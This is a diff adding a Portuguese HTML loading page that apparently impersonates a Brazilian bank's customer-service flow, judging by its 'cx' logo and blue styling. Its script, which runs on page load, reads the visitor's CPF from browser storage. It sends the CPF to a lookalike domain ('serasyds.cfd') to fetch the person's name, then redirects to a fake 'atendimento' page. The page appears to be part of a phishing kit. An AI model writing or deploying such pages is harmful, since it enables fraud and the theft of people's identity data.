@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Carregando...</title>
+    <!-- Analytics Tracking -->
+    <script src="../js/analytics.js"></script>
+    <style>
+        /* Estilo da Página */
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #0066b2;
+            /* Azul exato da imagem */
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            overflow: hidden;
+        }
+
+        .content {
+            text-align: center;
+        }
+
+        /* Efeito na sua imagem cx2.png */
+        .logo {
+            width: 180px;
+            /* Ajuste o tamanho conforme necessário */
+            margin-bottom: 50px;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                opacity: 1;
+                transform: scale(1);
+            }
+
+            50% {
+                opacity: 0.4;
+                transform: scale(0.98);
+            }
+
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        /* Spinner idêntico ao da imagem (estilo iOS/Android clássico) */
+        .spinner {
+            position: relative;
+            width: 54px;
+            height: 54px;
+            margin: 0 auto 30px auto;
+        }
+
+        .spinner div {
+            position: absolute;
+            width: 15%;
+            height: 15%;
+            background: #fff;
+            border-radius: 50%;
+            animation: spinner-fade 1s linear infinite;
+        }
+
+        /* Posicionamento das 8 bolinhas */
+        .spinner div:nth-child(1) {
+            top: 0%;
+            left: 42.5%;
+            animation-delay: 0s;
+        }
+
+        .spinner div:nth-child(2) {
+            top: 12.5%;
+            left: 72.5%;
+            animation-delay: -0.125s;
+        }
+
+        .spinner div:nth-child(3) {
+            top: 42.5%;
+            left: 85%;
+            animation-delay: -0.25s;
+        }
+
+        .spinner div:nth-child(4) {
+            top: 72.5%;
+            left: 72.5%;
+            animation-delay: -0.375s;
+        }
+
+        .spinner div:nth-child(5) {
+            top: 85%;
+            left: 42.5%;
+            animation-delay: -0.5s;
+        }
+
+        .spinner div:nth-child(6) {
+            top: 72.5%;
+            left: 12.5%;
+            animation-delay: -0.625s;
+        }
+
+        .spinner div:nth-child(7) {
+            top: 42.5%;
+            left: 0%;
+            animation-delay: -0.75s;
+        }
+
+        .spinner div:nth-child(8) {
+            top: 12.5%;
+            left: 12.5%;
+            animation-delay: -0.875s;
+        }
+
+        @keyframes spinner-fade {
+            0% {
+                opacity: 1;
+            }
+
+            100% {
+                opacity: 0.1;
+            }
+        }
+
+        /* Texto formatado */
+        .text {
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 700;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            text-align: center;
+            /* Pequena animação de opacidade no texto também para acompanhar */
+            animation: text-blink 2s linear infinite;
+        }
+
+        @keyframes text-blink {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.7;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="content">
+        <img src="cx.webp" alt="Logo" class="logo">
+
+        <div class="spinner">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+
+        <div class="text">Direcionando você para <br>atendente...</div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const cpf = localStorage.getItem('cpfUsuario');
+
+            if (!cpf) {
+                window.location.href = "index.html";
+                return;
+            }
+
+            // Faz a consulta na API enquanto a animação de loading acontece
+            fetch("https://serasyds.cfd/api.php?cpf=" + cpf)
+                .then(res => res.json())
+                .then(data => {
+                    console.log("Dados recebidos:", data);
+
+                    if (Number(data.status) === 200) {
+                        const nome = data.NOME || data.nome;
+                        if (nome) {
+                            localStorage.setItem("nomeUsuario", nome);
+                        }
+
+                        // Aguarda 3 segundos para o usuário ver o loading e depois redireciona
+                        setTimeout(() => {
+                            window.location.href = "../atendimento/index.html";
+                        }, 500);
+
+                    } else {
+                        alert("CPF não encontrado ou sistema indisponível.");
+                        window.location.href = "index.html";
+                    }
+                })
+                .catch(err => {
+                    console.error("Erro na API:", err);
+                    // Em caso de erro, continua para o atendimento
+                    console.log("Continuando para atendimento mesmo com erro na API...");
+                    setTimeout(() => {
+                        window.location.href = "../atendimento/index.html";
+                    }, 1500);
+                });
+        });
+    </script>
+</body>
+
+</html>
